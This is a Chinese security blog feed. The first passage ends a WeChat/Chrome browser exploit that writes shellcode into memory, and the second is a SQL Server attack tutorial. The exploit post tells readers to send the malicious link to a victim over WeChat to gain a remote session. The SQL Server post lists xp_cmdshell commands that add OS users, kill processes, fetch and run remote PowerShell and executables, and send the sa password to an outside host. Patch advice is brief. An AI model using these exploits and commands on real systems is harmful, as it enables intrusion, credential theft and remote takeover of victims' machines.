content) &#123;</span><br><span class="line">        for (var i &#x3D; 0; i &lt; content.length; i++) &#123;</span><br><span class="line">            this.write8(addr + i, content[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function trigger() &#123;</span><br><span class="line">    var oob &#x3D; oobAccess();</span><br><span class="line"></span><br><span class="line">    var func_ptr &#x3D; oob.leakPtr(target_function);</span><br><span class="line">    print(&#39;[*] target_function at 0x&#39; + func_ptr.toString(16));</span><br><span class="line"></span><br><span class="line">    var kCodeInsOffset &#x3D; 0x1b;</span><br><span class="line"></span><br><span class="line">    var code_addr &#x3D; oob.read32(func_ptr + kCodeInsOffset);</span><br><span class="line">    print(&#39;[*] code_addr at 0x&#39; + code_addr.toString(16));</span><br><span class="line"></span><br><span class="line">    oob.setBytes(code_addr, shellcode);</span><br><span class="line"></span><br><span class="line">    target_function(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line">    print(&quot;start running&quot;);</span><br><span class="line">    trigger();</span><br><span class="line">&#125;catch(e)&#123;</span><br><span class="line">    print(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-23.png"></p><ul><li>然后通过微信将我们的恶意链接发给对方，等待他点击该链接后即可成功得到目标主机会话。<br>  <img src="/images/pasted-27.png"><br>  <img src="/images/pasted-24.png"></li><li>tips<ul><li>对于微信4.2.1.143版本，这是爆出漏洞后的第一次更新，临时关闭了微信内置浏览器，采取白名单方式进行验证，仅允许*.weixin.qq.com白名单域名通过内置浏览器打开，但是依旧没有开启沙盒，所以我们还可以通过公众号的阅读原文等方式来访问恶意链接上线CS/MSF。</li><li>对于微信4.2.1.151版本，这是爆出漏洞后的第二次更新，基本上已经完全修复了这个漏洞，升级了微信版本、暂时不用wechatweb.exe做为内置浏览器（不过文件还在，说不定还会用）、删除禁用沙盒–no-sandbox参数等，目前在线升级只能到143，151需要通过官网下载。</li></ul></li></ul><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ul><li>升级Chrome浏览器为最新版本（90.0.4430.72）</li><li>升级Windows微信为最新版本（3.2.1.151）</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;微信-Chrome远程代码执行&quot;&gt;&lt;a href=&quot;#微信-Chrome远程代码执行&quot; class=&quot;headerlink&quot; title=&quot;微信-Chrome远程代码执行&quot;&gt;&lt;/a&gt;微信-Chrome远程代码执行&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="远程代码执行" scheme="https://kb-at-zero.github.io/categories/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
    
    <category term="微信" scheme="https://kb-at-zero.github.io/tags/%E5%BE%AE%E4%BF%A1/"/>
    
    <category term="chrome" scheme="https://kb-at-zero.github.io/tags/chrome/"/>
    
  </entry>
  
  <entry>
    <title>攻防演练-SQL Server数据库安全</title>
    <link href="https://kb-at-zero.github.io/2021/04/21/Web%E5%AE%89%E5%85%A8-SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"/>
    <id>https://kb-at-zero.github.io/2021/04/21/Web%E5%AE%89%E5%85%A8-SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/</id>
    <published>2021-04-21T14:03:00.000Z</published>
    <updated>2021-04-24T07:10:35.978Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL-Server数据库安全"><a href="#SQL-Server数据库安全" class="headerlink" title="SQL Server数据库安全"></a>SQL Server数据库安全</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在网络安全实战攻防演练中，办公应用系统、Web中间件，数据库等是攻击方主要的攻击对象，由于使用量最大，数据库往往会成为攻击者的 首选目标之一。以微软SQL Server为例，除了常见的SQL注入漏洞，攻击方还会用一些“出其不意”的招式，将SQL Server原本的优势转变为攻击的突破口，比如在相应的权限下，攻击者可以利用SQL Server 强大的存储过程执行不同的高级功能，通过增加SQL Server数据库用户，权限维持等方式，攻击用户数据库系统，下文将详述攻击方那些“不常见”的数据库攻击手段以及防守方的应对思路。</p><hr><h2 id="SQL-Server概述"><a href="#SQL-Server概述" class="headerlink" title="SQL Server概述"></a>SQL Server概述</h2><p>SQL Server是Microsoft开发的关系数据库管理系统（RDBMS）。 它是市场上最受欢迎的DBMS之一。SQL Server具有极其广泛的用途，它可以在各个方面使用,从存储个人博客的内容到存储客户数据等。在2017版之前，SQL Server仅适用于Windows。 SQL Server 2017中最大的变化之一是，它现在可在Linux和Docker容器上使用。这意味着可以在Mac上运行SQL Server。<br>SQL Server的可用版本</p><table><thead><tr><th>版本</th><th>描述</th></tr></thead><tbody><tr><td>Enterprise Edition</td><td>此版本仅在Windows Server操作系统上运行。 适用于对速度和可用性具有较高优先级的大型生产数据库服务器。提供复制和联机分析过程（OLAP）服务等功能，这些服务可能会增加其安全风险。</td></tr><tr><td>Standard Edition</td><td>该版本与Enterprise Edition相似，但缺少虚拟接口系统局域网（VI SAN）支持和某些高级OLAP功能。</td></tr><tr><td>Personal Edition</td><td>它旨在用于工作站和便携式计算机，而不是服务器。 其设计最多支持五个数据库用户。</td></tr><tr><td>Developer Edition</td><td>面向开发人员版本，它与Enterprise Edition具有相似的功能，但并不意味着可以在真实的生产环境中运行。</td></tr></tbody></table><hr><h2 id="客户端-服务器数据库系统"><a href="#客户端-服务器数据库系统" class="headerlink" title="客户端/服务器数据库系统"></a>客户端/服务器数据库系统</h2><p>SQL Server是一个客户端/服务器数据库管理系统（DBMS）。这允许有许多不同的客户端同时，全部连接到SQL Server。这些客户端的每一个都可以通过不同的工具进行连接。<br>例如，一个客户端可能使用如SQL Server Management Studio（SSMS）之类的图形工具，而另一客户端可能使用诸如sqlcmd之类的命令行工具。 同时，网站也可以从Web应用程序连接到SQL Server。并且可能有许多其他客户端都使用自己的工具出于自己的目的进行连接。</p><p>客户端/服务器DBMS的主要优点是多个用户可以同时访问它，每个用户都有特定的访问级别。如果数据库管理员配置对应的权限，则任何连接到SQL Server的客户端将只能访问他们被允许访问的数据库。他们只能执行允许执行的任务。 所有这些都从SQL Server本身内部进行控制。</p><p>SQL Server是在服务帐户的上下文中在操作系统上运行的一组Windows服务。每次安装SQL Server实例时，实际上都会安装一组Windows服务并具有唯一的名称。现有的SQL Server帐户类型：</p><ul><li>Windows帐户。</li><li>SQL Server登录名（SQL Server内部）。</li><li>数据库用户（SQL Server内部）。</li></ul><p>Windows帐户和SQL Server登录名用于登录SQL Server。除非系统管理员，否则必须将SQL Server登录名映射到数据库用户才能访问数据。数据库用户是在数据库级别内单独创建的。<br>SQL Server的常见角色是：</p><ul><li>Sysadmin角色：SQL Server管理员。</li><li>Public角色：最低特权，类似于Windows中的everyone组。</li><li>更多请参考：<a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017">https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017</a></li></ul><hr><h2 id="TDS协议"><a href="#TDS协议" class="headerlink" title="TDS协议"></a>TDS协议</h2><p>表格数据流（Tabular Data Stream,TDS）协议是一种数据库服务器和客户端间交互的应用层协议，为微软SQL Server数据库和Sybase公司数据库产品所采用。</p><table><thead><tr><th>TDS Version</th><th>Supported Products</th></tr></thead><tbody><tr><td>4.2</td><td>Sybase SQL Server &lt; 10 and Microsoft SQL Server 6.5</td></tr><tr><td>5.0</td><td>Sybase SQL Server &gt;= 10</td></tr><tr><td>7.0</td><td>Microsoft SQL Server 7.0</td></tr><tr><td>7.1</td><td>Microsoft SQL Server 2000</td></tr><tr><td>7.2</td><td>Microsoft SQL Server 2005</td></tr></tbody></table><p>详细的协议结构分析，请参考：[<a href="http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/td">http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/td</a></p><hr><h1 id="SQL-Server一些常用的攻击面的利用方式。"><a href="#SQL-Server一些常用的攻击面的利用方式。" class="headerlink" title="SQL Server一些常用的攻击面的利用方式。"></a>SQL Server一些常用的攻击面的利用方式。</h1><h2 id="SQL-Server危险的存储过程"><a href="#SQL-Server危险的存储过程" class="headerlink" title="SQL Server危险的存储过程"></a>SQL Server危险的存储过程</h2><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><h4 id="查询xp-cmdshell存储过程是否存在"><a href="#查询xp-cmdshell存储过程是否存在" class="headerlink" title="查询xp_cmdshell存储过程是否存在"></a>查询xp_cmdshell存储过程是否存在</h4><p>xtype为对象类型，xtype=&#39;x&#39;，表示存储过程的对象类型为扩展存储过程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from master.dbo.sysobjects where xtype&#x3D;&#39;x&#39; and name&#x3D;&#39;xp_cmdshell&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image1.png"></p><p>TSQL代码判断是否开启xp_cmdshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">declare @RunningOnACluster char(1) declare @xp_cmdshell_available char(1) declare @result int</span><br><span class="line">set @xp_cmdshell_available&#x3D;&#39;Y&#39; set @result&#x3D;0</span><br><span class="line">select @RunningOnACluster&#x3D;case</span><br><span class="line">when convert(int, serverproperty(&#39;IsClustered&#39;)) &#x3D; 1 then &#39;Y&#39; else &#39;N&#39;</span><br><span class="line">end</span><br><span class="line">if(0&#x3D;(select value_in_use from sys.configurations where name&#x3D;&#39;xp_cmdshell&#39;)) </span><br><span class="line">set @xp_cmdshell_available&#x3D;&#39;N&#39; if @RunningOnACluster&#x3D;&#39;Y&#39;</span><br><span class="line">begin</span><br><span class="line">if @xp_cmdshell_available&#x3D;&#39;Y&#39; </span><br><span class="line">    select @result&#x3D;1 </span><br><span class="line">    if @xp_cmdshell_available&#x3D;&#39;N&#39; </span><br><span class="line">    select @result&#x3D;2</span><br><span class="line">end </span><br><span class="line">select @result</span><br></pre></td></tr></table></figure><p><img src="/images/image2.png"></p><h4 id="恢复xp-cmdshell存储过程"><a href="#恢复xp-cmdshell存储过程" class="headerlink" title="恢复xp_cmdshell存储过程"></a>恢复xp_cmdshell存储过程</h4><p>解决Error Message:未能找到存储过程’master..xp_cmdshell’。</p><p>第一步先删除：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drop procedure sp_addextendedproc </span><br><span class="line">drop procedure sp_oacreate</span><br><span class="line">exec sp_dropextendedproc &#39;xp_cmdshell&#39;</span><br></pre></td></tr></table></figure><p>第二步恢复：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;sp_oacreate&quot;,&quot;odsole70.dll&quot;) </span><br><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot; &quot;)</span><br></pre></td></tr></table></figure><p><img src="/images/image3.png"></p><p>直接恢复，不管sp_addextendedproc是不是存在，需要自行上传xplog70.dll，恢复扩展存储过过程<br>xp_cmdshell的语句:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;)</span><br></pre></td></tr></table></figure><p>代码判断一系列存储过程是否存在，若不存在则恢复。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if not exists (select * from dbo.sysobjects where id &#x3D; object_id(N&#39;[dbo].</span><br><span class="line">[xp_cmdshell]&#39;))</span><br><span class="line">dbcc addextendedproc (&#39;xp_cmdshell&#39;,&#39;xplog70.dll&#39;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id &#x3D; object_id(N&#39;[dbo].</span><br><span class="line">[xp_dirtree]&#39;))</span><br><span class="line">dbcc addextendedproc (&#39;xp_dirtree&#39;,&#39;xpstar.dll&#39;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id &#x3D; object_id(N&#39;[dbo].</span><br><span class="line">[xp_fixeddrives]&#39;))</span><br><span class="line">dbcc addextendedproc (&#39;xp_fixeddrives&#39;,&#39;xpstar.dll&#39;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id &#x3D; object_id(N&#39;[dbo].</span><br><span class="line">[xp_regwrite]&#39;))</span><br><span class="line">dbcc addextendedproc (&#39;xp_regwrite&#39;,&#39;xpstar.dll&#39;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id &#x3D; object_id(N&#39;[dbo].</span><br><span class="line">[xp_regread]&#39;))</span><br><span class="line">dbcc addextendedproc (&#39;xp_regread&#39;,&#39;xpstar.dll&#39;)</span><br></pre></td></tr></table></figure><p><img src="/images/image4.png"></p><h4 id="开启xp-cmdshell存储过程"><a href="#开启xp-cmdshell存储过程" class="headerlink" title="开启xp_cmdshell存储过程"></a>开启xp_cmdshell存储过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1; RECONFIGURE; exec SP_CONFIGURE</span><br><span class="line">&#39;xp_cmdshell&#39;, 1; RECONFIGURE;</span><br></pre></td></tr></table></figure><h4 id="关闭xp-cmdshell存储过程"><a href="#关闭xp-cmdshell存储过程" class="headerlink" title="关闭xp_cmdshell存储过程"></a>关闭xp_cmdshell存储过程</h4><p>关闭xp_cmdshell配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure</span><br><span class="line">&#39;xp_cmdshell&#39;, 0;RECONFIGURE;</span><br></pre></td></tr></table></figure><p><img src="/images/image5.png"></p><p>删除xp_cmdshell的语句:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_dropextendedproc &#39;xp_cmdshell&#39;;</span><br></pre></td></tr></table></figure><p>删除xp_cmdshell过程，再添加xp_cmdshell过程，需要自行上传xplog70.dll恢复被删除的 xp_cmdshell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">drop procedure xp_cmdshell;</span><br><span class="line">exec sp_addextendedproc &quot;xp_cmdshell&quot;, &quot;xplog70.dll&quot;;</span><br></pre></td></tr></table></figure><p>附录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">exec sp_addextendedproc xp_cmdshell ,@dllname &#x3D;&#39;xplog70.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_enumgroups ,@dllname &#x3D;&#39;xplog70.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_loginconfig ,@dllname &#x3D;&#39;xplog70.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_enumerrorlogs ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_getfiledetails ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br><span class="line">exec sp_addextendedproc Sp_OACreate ,@dllname &#x3D;&#39;odsole70.dll&#39;</span><br><span class="line">exec sp_addextendedproc Sp_OADestroy ,@dllname &#x3D;&#39;odsole70.dll&#39;</span><br><span class="line">exec sp_addextendedproc Sp_OAGetErrorInfo ,@dllname &#x3D;&#39;odsole70.dll&#39;</span><br><span class="line">exec sp_addextendedproc Sp_OAGetProperty ,@dllname &#x3D;&#39;odsole70.dll&#39;</span><br><span class="line">exec sp_addextendedproc Sp_OAMethod ,@dllname &#x3D;&#39;odsole70.dll&#39;</span><br><span class="line">exec sp_addextendedproc Sp_OASetProperty ,@dllname &#x3D;&#39;odsole70.dll&#39;</span><br><span class="line">exec sp_addextendedproc Sp_OAStop ,@dllname &#x3D;&#39;odsole70.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_regaddmultistring ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_regdeletekey ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_regdeletevalue ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_regenumvalues ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_regremovemultistring ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_regwrite ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_dirtree ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_regread ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_fixeddrives ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br></pre></td></tr></table></figure><h4 id="xp-cmdshell执行系统命令"><a href="#xp-cmdshell执行系统命令" class="headerlink" title="xp_cmdshell执行系统命令"></a>xp_cmdshell执行系统命令</h4><h5 id="xp-cmdshell执行whoami命令"><a href="#xp-cmdshell执行whoami命令" class="headerlink" title="xp_cmdshell执行whoami命令"></a>xp_cmdshell执行whoami命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_cmdshell &#39;whoami&#39;</span><br><span class="line">exec xp_cmdshell &quot;whoami&quot;;</span><br></pre></td></tr></table></figure><p><img src="/images/image7.png"></p><h5 id="xp-cmdshell执行ipconfig-all命令"><a href="#xp-cmdshell执行ipconfig-all命令" class="headerlink" title="xp_cmdshell执行ipconfig/all命令"></a>xp_cmdshell执行ipconfig/all命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;ipconfig&#x2F;all&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image8.png"></p><h5 id="查询操作系统和版本信息（分别对应中英文系统）"><a href="#查询操作系统和版本信息（分别对应中英文系统）" class="headerlink" title="查询操作系统和版本信息（分别对应中英文系统）"></a>查询操作系统和版本信息（分别对应中英文系统）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot;&#39; </span><br><span class="line">exec master..xp_cmdshell &#39;systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS 名称&quot; &#x2F;C:&quot;OS 版本&quot;&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image9.png"></p><h5 id="通过xp-cmdshell执行wmic-获取系统信息"><a href="#通过xp-cmdshell执行wmic-获取系统信息" class="headerlink" title="通过xp_cmdshell执行wmic 获取系统信息"></a>通过xp_cmdshell执行wmic 获取系统信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;wmic cpu get name,NumberOfCores,NumberOfLogicalProcessors&#x2F;Format:List&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image10.png"></p><h5 id="调用reg-query注册表键值判断RDP服务的端口号"><a href="#调用reg-query注册表键值判断RDP服务的端口号" class="headerlink" title="调用reg query注册表键值判断RDP服务的端口号"></a>调用reg query注册表键值判断RDP服务的端口号</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp &#x2F;v PortNumber&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image11.png"></p><h5 id="通过xp-cmdshell执行添加testuser1用户并且不输出结果"><a href="#通过xp-cmdshell执行添加testuser1用户并且不输出结果" class="headerlink" title="通过xp_cmdshell执行添加testuser1用户并且不输出结果"></a>通过xp_cmdshell执行添加testuser1用户并且不输出结果</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;Net user testuser1 passwd1 &#x2F;workstations:* &#x2F;times:all &#x2F;passwordchg:yes &#x2F;passwordreq:yes &#x2F;active:yes &#x2F;add&#39;,NO_OUTPUT</span><br></pre></td></tr></table></figure><p><img src="/images/image12.png"></p><h5 id="通过xp-cmdshell删除testuser1用户并且不输出结果"><a href="#通过xp-cmdshell删除testuser1用户并且不输出结果" class="headerlink" title="通过xp_cmdshell删除testuser1用户并且不输出结果"></a>通过xp_cmdshell删除testuser1用户并且不输出结果</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#39;net user testuser1&#x2F;delete&#39;, NO_OUTPUT</span><br></pre></td></tr></table></figure><p><img src="/images/image13.png"></p><p>通过xp_cmdshell执行taskkill 杀死taskmgr.exe，taskmgr.exe用于任务管理器。它显示系统中正在运行的进程。该程序使用Ctrl+Alt+Del（一般是弹出Windows安全再点击“任务管理器”）或者 Ctrl+Shift+Esc打开，这不是纯粹的系统程序，但是如果终止它，可能会导致不可知的问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_cmdshell &#39;taskkill &#x2F;f &#x2F;im taskmgr.exe&#39;;</span><br></pre></td></tr></table></figure><h5 id="调用xp-cmdshell执行mkdir命令创建目录"><a href="#调用xp-cmdshell执行mkdir命令创建目录" class="headerlink" title="调用xp_cmdshell执行mkdir命令创建目录"></a>调用xp_cmdshell执行mkdir命令创建目录</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;mkdir &quot;C:\test\&quot; &#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image14.png"></p><h5 id="通过xp-cmdshell执行dir命令"><a href="#通过xp-cmdshell执行dir命令" class="headerlink" title="通过xp_cmdshell执行dir命令"></a>通过xp_cmdshell执行dir命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;dir c:\&#39; </span><br><span class="line">exec xp_cmdshell &#39;dir c:\&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image15.png"></p><h5 id="通过xp-cmdshell删除文件"><a href="#通过xp-cmdshell删除文件" class="headerlink" title="通过xp_cmdshell删除文件"></a>通过xp_cmdshell删除文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;del C:\test&#39;;</span><br></pre></td></tr></table></figure><h5 id="xp-cmdshell调用Powershell"><a href="#xp-cmdshell调用Powershell" class="headerlink" title="xp_cmdshell调用Powershell"></a>xp_cmdshell调用Powershell</h5><p>通过xp_cmdshell调用powershell 下载<a href="http://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1">http://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell &#39;powershell -c &quot;iex((new-object Net.WebClient).DownloadString(&#39;&#39;http:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;cheetz&#x2F;PowerSpl oit&#x2F;master&#x2F;CodeExecution&#x2F;Invoke--Shellcode.ps1&#39;&#39;))&quot;&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image16.png"></p><p>调用xp_cmdshell执行echo  CreateObject最后写入C:/ProgramData/vget.vbs文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;echo Set x&#x3D; CreateObject(^&quot;Microsoft.XMLHTTP^&quot;):x.Open</span><br><span class="line">^&quot;GET^&quot;,LCase(WScript.Arguments(0)),0:x.Send():Set s &#x3D; CreateObject(^&quot;ADODB.Stream^&quot;):s.Mode &#x3D; 3:s.Type &#x3D; 1:s.Open():s.Write(x.responseBody):s.SaveToFile LCase(WScript.Arguments(1)),2 &gt; C:&#x2F;ProgramData&#x2F;vget.vbs&#39;;</span><br></pre></td></tr></table></figure><p><img src="/images/image17.png"></p><p>通过xp_cmdshell调用cmd.exe 执行powershell调用OpenRead方法向数据库发送登录用户名sa密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell &#39;powershell (new-object System.Net.WebClient).OpenRead(&#39;&#39;http:&#x2F;&#x2F;example&#x2F;test.jsp? data&#x3D;127.0.0.1%7c1433%7csa%7cDb123456&#39;&#39;)&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image18.png"></p><p>通过xp_cmdshell调用powershell下载test0.exe后并执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;&quot;echo $client &#x3D; New-Object System.Net.WebClient &gt;</span><br><span class="line">%TEMP%\test.ps1 &amp; echo</span><br><span class="line">$client.DownloadFile(&quot;http:&#x2F;&#x2F;example&#x2F;test0.exe&quot;,&quot;%TEMP%\test.exe&quot;) &gt;&gt;</span><br><span class="line">%TEMP%\test.ps1 &amp; powershell -ExecutionPolicy Bypass %temp%\test.ps1 &amp; WMIC process call create &quot;%TEMP%\test.exe&quot;&quot;&#39;</span><br></pre></td></tr></table></figure><hr><h3 id="xp-regread"><a href="#xp-regread" class="headerlink" title="xp_regread"></a>xp_regread</h3><p>SQL Server存在一系列的存储过程，可以对注册表进行增删改查。xp_regread、xp_regwrite、xp_regdeletvalue、xp_regdeletkey、xp_regaddmultistring等。</p><h4 id="读注册表"><a href="#读注册表" class="headerlink" title="读注册表"></a>读注册表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_regread &#39;HKEY_current_user&#39;,&#39;Control Panel\International&#39;,&#39;sCountry&#39; exec xp_regread N&#39;HKEY_LOCAL_MACHINE&#39;, N&#39;SYSTEM\CurrentControlSet\Services\MSSEARCH&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image19.png"></p><h4 id="枚举可用的注册表键值"><a href="#枚举可用的注册表键值" class="headerlink" title="枚举可用的注册表键值"></a>枚举可用的注册表键值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_regenumkeys &#39;HKEY_CURRENT_USER&#39;,&#39;Control Panel\International&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image20.png"></p><hr><h3 id="xp-fileexist"><a href="#xp-fileexist" class="headerlink" title="xp_fileexist"></a>xp_fileexist</h3><p>判读文件是否存在，第一列返回0表示文件不存在，返回1表示文件存在。当执行完无回显命令时，一般都将结果输入至文件中，利用此存储过程可以判断无回显命令是否执行成功。</p><h4 id="判读文件是否存在"><a href="#判读文件是否存在" class="headerlink" title="判读文件是否存在"></a>判读文件是否存在</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_fileexist &#39;C:\\test\test.txt&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image21.png"></p><hr><h4 id="列出当前目录"><a href="#列出当前目录" class="headerlink" title="列出当前目录"></a>列出当前目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_subdirs 